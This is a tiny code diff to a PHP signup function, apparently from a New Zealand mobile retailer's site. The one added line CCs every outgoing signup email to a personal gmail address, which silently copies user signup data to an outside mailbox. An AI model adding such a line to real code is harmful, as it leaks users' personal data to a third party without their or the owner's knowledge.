@@ -774,6 +774,7 @@ function agent_create_signup() {
 
 	
 		$headers = "From: reply@kiwimobiles.co.nz" . "\r\n" .
+		"CC: mufaqar@gmail.com";
 
 
 	
